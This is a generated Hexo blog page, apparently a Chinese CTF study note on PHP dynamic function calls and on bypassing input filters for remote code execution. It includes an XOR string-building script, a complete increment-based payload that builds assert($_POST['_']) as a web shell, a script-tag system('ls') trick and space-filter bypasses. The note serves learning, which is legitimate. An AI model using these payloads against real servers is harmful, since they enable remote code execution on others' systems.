@@ -1,0 +1,214 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP中的一些特性 | Blank</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[TOC] 1,PHP中的输入输出变量替换php在传入变量时会把特殊的一些字符替换为_ 2，PHP 动态函数特性PHP 动态函数调用是指在运行时根据字符串变量来决定调用哪个函数， 也就是将字符串当作了函数执行 1. 变量函数 (Variable Functions)php 12$func &#x3D; &#x27;strlen&#x27;;echo $func(&#x27;hello&#x27;);  &#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP中的一些特性">
+<meta property="og:url" content="http://example.com/2026/01/25/PHP%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="Blank">
+<meta property="og:description" content="[TOC] 1,PHP中的输入输出变量替换php在传入变量时会把特殊的一些字符替换为_ 2，PHP 动态函数特性PHP 动态函数调用是指在运行时根据字符串变量来决定调用哪个函数， 也就是将字符串当作了函数执行 1. 变量函数 (Variable Functions)php 12$func &#x3D; &#x27;strlen&#x27;;echo $func(&#x27;hello&#x27;);  &#x2F;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-01-25T06:17:24.108Z">
+<meta property="article:modified_time" content="2026-01-25T06:27:42.453Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PHP中的一些特性",
+  "url": "http://example.com/2026/01/25/PHP%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2026-01-25T06:17:24.108Z",
+  "dateModified": "2026-01-25T06:27:42.453Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "John Doe",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/01/25/PHP%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP中的一些特性',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Blank</span></a><a class="nav-page-title" href="/"><span class="site-name">PHP中的一些特性</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">PHP中的一些特性</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-25T06:17:24.108Z" title="发表于 2026-01-25 14:17:24">2026-01-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-25T06:27:42.453Z" title="更新于 2026-01-25 14:27:42">2026-01-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>[TOC]</p>
+<h1 id="1-PHP中的输入输出变量替换"><a href="#1-PHP中的输入输出变量替换" class="headerlink" title="1,PHP中的输入输出变量替换"></a>1,PHP中的输入输出变量替换</h1><p>php在传入变量时会把特殊的一些字符替换为_</p>
+<h1 id="2，PHP-动态函数特性"><a href="#2，PHP-动态函数特性" class="headerlink" title="2，PHP 动态函数特性"></a>2，PHP 动态函数特性</h1><p>PHP 动态函数调用是指在运行时根据字符串变量来决定调用哪个函数，</p>
+<p>也就是将字符串当作了函数执行</p>
+<h3 id="1-变量函数-Variable-Functions"><a href="#1-变量函数-Variable-Functions" class="headerlink" title="1. 变量函数 (Variable Functions)"></a>1. <strong>变量函数 (Variable Functions)</strong></h3><p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;strlen&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$func</span>(<span class="string">&#x27;hello&#x27;</span>);  <span class="comment">// 输出 5，相当于 strlen(&#x27;hello&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-动态方法调用"><a href="#2-动态方法调用" class="headerlink" title="2. 动态方法调用"></a>2. <strong>动态方法调用</strong></h3><p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$method</span> = <span class="string">&#x27;myMethod&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="variable">$method</span>();  <span class="comment">// 输出 Hello</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-可调用对象"><a href="#3-可调用对象" class="headerlink" title="3. 可调用对象"></a>3. <strong>可调用对象</strong></h3><p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$callable</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Anonymous&quot;</span>; &#125;;</span><br><span class="line"><span class="variable">$callable</span>();  <span class="comment">// 输出 Anonymous</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-直接字符串调用-已弃用"><a href="#4-直接字符串调用-已弃用" class="headerlink" title="4. 直接字符串调用 (已弃用)"></a>4. <strong>直接字符串调用 (已弃用)</strong></h3><p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PHP 8.0+ 已移除，但早期版本支持</span></span><br><span class="line"><span class="string">&#x27;phpinfo&#x27;</span>();  <span class="comment">// 相当于 phpinfo()</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-复杂动态调用"><a href="#5-复杂动态调用" class="headerlink" title="5. 复杂动态调用"></a>5. <strong>复杂动态调用</strong></h3><p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span>(代码);  <span class="comment">// 执行 assert(代码)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="3，特殊的RCE"><a href="#3，特殊的RCE" class="headerlink" title="3，特殊的RCE"></a>3，特殊的RCE</h1><h2 id="1-无字母RCE"><a href="#1-无字母RCE" class="headerlink" title="1,无字母RCE"></a>1,无字母RCE</h2><p>通常三种绕过方法</p>
+<h4 id="1，利用取反符号’-’"><a href="#1，利用取反符号’-’" class="headerlink" title="1，利用取反符号’~’"></a>1，利用取反符号’~’</h4><p>取反后进行URL编码过后再次取反，可以得到原来的指令。</p>
+<h4 id="2，异或’-’"><a href="#2，异或’-’" class="headerlink" title="2，异或’^’"></a>2，异或’^’</h4><p>给出一个自动化脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对 answer 中的每个字符 c</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="comment"># 从 valid 字符集中找两个字符 i, j</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="comment"># 如果 i XOR j == c</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 找到一对就停止</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tmp1, tmp2)  <span class="comment"># 输出两个看起来&quot;无害&quot;的字符串</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="3，自增绕过"><a href="#3，自增绕过" class="headerlink" title="3，自增绕过"></a>3，自增绕过</h4><p>通过数组[]来获取array中的某个字符，再通过自增方法可以执行任意指令。</p>
+<p>给出一个常用payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<p>等价于构造出了 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>意味着从 POST 参数 <code>_</code> 中取 PHP 代码字符串并执行。</p>
+<h1 id="4、RCE过滤"><a href="#4、RCE过滤" class="headerlink" title="4、RCE过滤"></a>4、RCE过滤</h1><p>1、?过滤</p>
+<p>可以用标签形式过滤（html文本）</p>
+<p>格式如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="title function_">system</span>(<span class="string">&#x27;ls&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、空格绕过</p>
+<p>通常过滤是可以用编码转化绕过的</p>
+<p>例如URL编码，base64编码，进制转义编码等等。（%09）</p>
+<p>当然在Linux系统中${IFS}通常指空格</p>
+<p>5、通配符的作用</p>
+<p>*,在Linux中有着通配符的作用，可以匹配对应的系统文件，所以就无需输出文件的全部名称。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/25/PHP%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7/">http://example.com/2026/01/25/PHP%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Blank</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/25/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="smarty模板注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">smarty模板注入</div></div><div class="info-2"><div class="info-item-1">  先看这一张图片，要知道怎么对一个模板进行注入就先要知道对应的模板类型，在相对应会被渲染到模板上的地方先尝试${77}如果回显出了*”$49”**,就到上面的一步，否走则是下面的。 然后再测试a{*comment*}b,如果回显出了a*b的结果则可以判断出这个是Smarty模板，因为在这个情况下，双*会把其中的内容注释了。 接下来就详细了解一下Smarty模板 Smarty模板是PHP模板语言之一，它可以为不受信任的模板执行提供了安全模式。这会执行在php安全函数白名单的函数，所以我们无法直接在模板中直接调用php中直接 执行命令的函数（相当于设置了些disable_function）但是其实这个是没有多大影响的，依旧可以依靠Smarty自身的一些特性去达到执行指令的目的。 1234567891011$Smarty内置变量:    模板变量：如 $smarty.get、$smarty.post、$smarty.cookies 等，用于访问 HTTP 请求中的 GET、POST、COOKIE 数据。    环境变量：如 $smarty.server、$smarty.env 等，用...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">John Doe</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-PHP%E4%B8%AD%E7%9A%84%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%8F%98%E9%87%8F%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.</span> <span class="toc-text">1,PHP中的输入输出变量替换</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%EF%BC%8CPHP-%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-number">2.</span> <span class="toc-text">2，PHP 动态函数特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0-Variable-Functions"><span class="toc-number">2.1.</span> <span class="toc-text">1. 变量函数 (Variable Functions)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8A%A8%E6%80%81%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">2. 动态方法调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%AF%E8%B0%83%E7%94%A8%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.3.</span> <span class="toc-text">3. 可调用对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%9B%B4%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%B0%83%E7%94%A8-%E5%B7%B2%E5%BC%83%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">4. 直接字符串调用 (已弃用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%A4%8D%E6%9D%82%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8"><span class="toc-number">2.5.</span> <span class="toc-text">5. 复杂动态调用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3%EF%BC%8C%E7%89%B9%E6%AE%8A%E7%9A%84RCE"><span class="toc-number">3.</span> <span class="toc-text">3，特殊的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">3.1.</span> <span class="toc-text">1,无字母RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%8C%E5%88%A9%E7%94%A8%E5%8F%96%E5%8F%8D%E7%AC%A6%E5%8F%B7%E2%80%99-%E2%80%99"><span class="toc-number">3.1.1.</span> <span class="toc-text">1，利用取反符号’~’</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%8C%E5%BC%82%E6%88%96%E2%80%99-%E2%80%99"><span class="toc-number">3.1.2.</span> <span class="toc-text">2，异或’^’</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%8C%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.3.</span> <span class="toc-text">3，自增绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E3%80%81RCE%E8%BF%87%E6%BB%A4"><span class="toc-number">4.</span> <span class="toc-text">4、RCE过滤</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/25/PHP%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7/" title="PHP中的一些特性">PHP中的一些特性</a><time datetime="2026-01-25T06:17:24.108Z" title="发表于 2026-01-25 14:17:24">2026-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/25/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="smarty模板注入">smarty模板注入</a><time datetime="2026-01-25T06:15:27.913Z" title="发表于 2026-01-25 14:15:27">2026-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/25/php%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0/" title="PHP中的函数">PHP中的函数</a><time datetime="2026-01-25T04:37:34.000Z" title="发表于 2026-01-25 12:37:34">2026-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/20/strs%20run%20away/" title="字符逃逸">字符逃逸</a><time datetime="2025-12-20T07:45:08.531Z" title="发表于 2025-12-20 15:45:08">2025-12-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/14/0xGame-week1-web-wp/" title="0xGame week1 web wp">0xGame week1 web wp</a><time datetime="2025-11-14T04:37:34.000Z" title="发表于 2025-11-14 12:37:34">2025-11-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By John Doe</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 